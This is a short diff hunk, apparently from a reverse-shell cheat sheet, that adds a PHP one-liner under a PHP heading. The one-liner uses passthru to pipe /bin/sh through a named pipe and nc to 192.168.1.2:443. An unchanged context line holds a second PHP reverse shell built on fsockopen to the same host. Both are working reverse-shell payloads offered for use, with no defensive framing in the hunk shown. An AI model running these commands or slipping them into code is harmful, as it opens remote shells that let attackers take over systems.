@@ -319,6 +319,10 @@
    
   # <kbd>PHP</kbd>
   
+  ```php 
+  <?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f"); ?>
+  ```
+  
   ```php
   php -r '$sock=fsockopen("192.168.1.2",443);`/bin/sh -i <&3 >&3 2>&3`;'
   
